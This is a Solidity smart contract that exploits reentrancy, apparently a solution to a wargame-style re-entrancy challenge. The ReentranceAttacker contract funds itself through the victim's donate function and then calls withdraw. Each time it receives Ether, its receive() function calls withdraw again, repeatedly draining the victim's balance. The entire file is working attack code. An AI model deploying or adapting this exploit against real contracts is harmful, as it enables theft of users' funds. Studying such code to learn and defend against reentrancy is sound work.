// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "@openzeppelin/contracts/math/SafeMath.sol";

interface IReentrace {
    function withdraw(uint _amount) external;

    function balanceOf(address _who) external returns (uint256);

    function donate(address _to) external payable;
}

contract ReentranceAttacker {
    // No overflows
    using SafeMath for uint256;
    IReentrace attackVictim;
    uint attackAmount;
    bool startAttack;

    constructor(address _attackVictim) public {
        attackVictim = IReentrace(_attackVictim);
    }

    function fund() public payable {
        attackVictim.donate{value: msg.value}(address(this));
    }

    function attack() public {
        attackAmount = attackVictim.balanceOf(address(this));
        startAttack = true;
        attackVictim.withdraw(attackAmount);
    }

    receive() external payable {
        if (startAttack) {
            attackVictim.withdraw(attackAmount);
        }
    }
}
